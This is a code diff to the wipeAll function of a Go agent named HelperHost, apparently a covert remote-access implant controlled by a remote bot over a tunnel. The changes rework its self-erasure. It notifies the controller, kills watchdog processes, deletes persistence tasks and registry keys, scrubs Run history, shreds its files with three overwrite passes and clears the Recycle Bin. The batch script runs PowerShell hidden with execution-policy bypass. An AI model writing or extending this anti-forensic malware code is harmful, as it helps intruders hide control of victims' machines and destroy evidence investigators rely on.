@@ -542,14 +542,23 @@ func wipeAll() {
 	stopFlag = true
 	tok := token
 	bb := strings.TrimRight(botBase, "/")
+
+	// Notify bot FIRST while tunnel still works — otherwise "suppression en cours" hangs forever.
+	if tok != "" && bb != "" {
+		for i := 0; i < 3; i++ {
+			if reportWiped(tok) == nil {
+				break
+			}
+			time.Sleep(time.Second)
+		}
+	}
+
 	if runtime.GOOS == "windows" {
 		restoreWindowsNotifications()
-		// Write latest restore script BEFORE deleting the elevated wipe task.
 		restorePS1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
 		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
 		restoreWindowsSecurity()
 		scrubRunMRU()
-		// Do not scrub TEMP yet — bat needs restore script + will self-clean.
 	} else {
 		clearStateStore()
 	}
@@ -570,7 +579,6 @@ func wipeAll() {
 		clearStateStore()
 	}
 
-	// Unhide so delete tools can see paths, then wipe what we can now.
 	unhidePath(dir)
 	unhidePath(cacheDir)
 	_ = filepath.Walk(dir, func(p string, info os.FileInfo, err error) error {
@@ -600,20 +608,14 @@ func wipeAll() {
 		restorePS1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
 		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
 		bat := filepath.Join(os.TempDir(), "hh-wipe.cmd")
-		notifyLine := ""
-		if bb != "" && tok != "" {
-			notifyLine = "curl.exe -fsSL -X POST \"" + bb + "/agent?action=wiped\" -H \"Content-Type: application/json\" -d \"{\\\"token\\\":\\\"" + tok + "\\\"}\" >nul 2>&1\r\n"
-		}
+		// No RunAs -Wait (hangs on UAC). Prefer schtasks elevated restore, then shred+rmdir.
 		body := "@echo off\r\n" +
-			"ping 127.0.0.1 -n 3 >nul\r\n" +
-			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Get-CimInstance Win32_Process|?{$_.Name -match '^(wscript|cscript)\\.exe$' -and $_.CommandLine -match 'watchdog|reconnect|HelperHost'}|%%{Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}; Get-Process HelperHost,EdgeRelay -EA SilentlyContinue|Stop-Process -Force\" >nul 2>&1\r\n" +
-			"schtasks /Run /TN HelperHostWipeRestore >nul 2>&1\r\n" +
-			"ping 127.0.0.1 -n 4 >nul\r\n" +
-			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"try { Start-Process -FilePath powershell.exe -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File','" + restorePS1 + "') } catch { & powershell.exe -NoProfile -ExecutionPolicy Bypass -File '" + restorePS1 + "' }\" >nul 2>&1\r\n" +
 			"ping 127.0.0.1 -n 2 >nul\r\n" +
+			"schtasks /Run /TN HelperHostWipeRestore >nul 2>&1\r\n" +
+			"ping 127.0.0.1 -n 3 >nul\r\n" +
+			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + restorePS1 + "\" >nul 2>&1\r\n" +
 			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
-			"ping 127.0.0.1 -n 2 >nul\r\n" +
 			"schtasks /Delete /TN HelperHost /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostResume /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostBoot /F >nul 2>&1\r\n" +
@@ -627,12 +629,11 @@ func wipeAll() {
 			"attrib -h -s \"" + dir + "\" >nul 2>&1\r\n" +
 			"attrib -h -s /s /d \"" + cacheDir + "\\*\" >nul 2>&1\r\n" +
 			"attrib -h -s \"" + cacheDir + "\" >nul 2>&1\r\n" +
-			// Hard wipe: overwrite every file (3 passes) then permanent delete — never Recycle Bin
 			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"" +
 			"$ErrorActionPreference='SilentlyContinue'; " +
 			"function Shred-Tree([string]$Root){ if(-not(Test-Path -LiteralPath $Root)){return}; " +
 			"Get-ChildItem -LiteralPath $Root -Recurse -Force -File | ForEach-Object { " +
-			"try { $len=[Math]::Min($_.Length,64MB); $fs=[IO.File]::Open($_.FullName,'Open','Write','None'); " +
+			"try { $len=[Math]::Min($_.Length,32MB); $fs=[IO.File]::Open($_.FullName,'Open','Write','None'); " +
 			"$buf=New-Object byte[] ([Math]::Min(262144,[int]$len)); " +
 			"foreach($fill in @([byte]0,[byte]0xFF,[byte]0)){ for($i=0;$i -lt $buf.Length;$i++){$buf[$i]=$fill}; " +
 			"$fs.Seek(0,'Begin')|Out-Null; $left=$len; while($left -gt 0){ $n=[Math]::Min($buf.Length,$left); $fs.Write($buf,0,$n); $left-=$n } }; " +
@@ -640,14 +641,11 @@ func wipeAll() {
 			"cmd /c \\\"rmdir /s /q `\\\"$Root`\\\"\\\" | Out-Null }; " +
 			"Shred-Tree '" + strings.ReplaceAll(dir, "'", "''") + "'; " +
 			"Shred-Tree '" + strings.ReplaceAll(cacheDir, "'", "''") + "'; " +
-			"Clear-RecycleBin -Force -ErrorAction SilentlyContinue; " +
-			"$shell=New-Object -ComObject Shell.Application; " +
-			"try { $rb=$shell.NameSpace(0xA); if($rb){ foreach($i in @($rb.Items())){ if($i.Name -match 'HelperHost|EdgeRelay|hh-'){ Remove-Item -LiteralPath $i.Path -Force -Recurse -EA SilentlyContinue } } } } catch {}" +
+			"Clear-RecycleBin -Force -ErrorAction SilentlyContinue" +
 			"\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + dir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + cacheDir + "\" >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\HelperHost\" /f >nul 2>&1\r\n" +
-			notifyLine +
 			"del /f /q \"" + restorePS1 + "\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-elev-*.ps1\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-install.*\" >nul 2>&1\r\n" +
